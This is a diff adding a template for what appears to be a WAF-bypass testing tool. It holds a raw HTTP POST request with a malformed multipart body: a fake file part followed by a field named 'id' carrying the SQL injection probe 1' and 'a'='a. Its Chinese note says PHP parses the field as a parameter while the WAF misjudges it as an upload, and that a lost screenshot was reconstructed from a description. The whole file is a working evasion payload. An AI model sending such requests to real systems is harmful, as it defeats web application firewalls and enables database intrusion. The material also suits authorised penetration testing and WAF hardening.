@@ -1,0 +1,21 @@
+# @name: multipart构造假part(v2)
+# @tags: post,multipart,fake-part,no-newline,php,id,bypass
+# @color: pink
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_fake_part_v2
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 与 v1 类似但少一个换行：假 part 的 Content-Disposition 后直接跟 payload，数据更纯净，PHP 仍解析为 POST 参数而 WAF 误判上传。参考 do9gy multipart Part1 第5条，截图丢失按描述还原。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="id"; filename="1.png"
+--a
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--a--
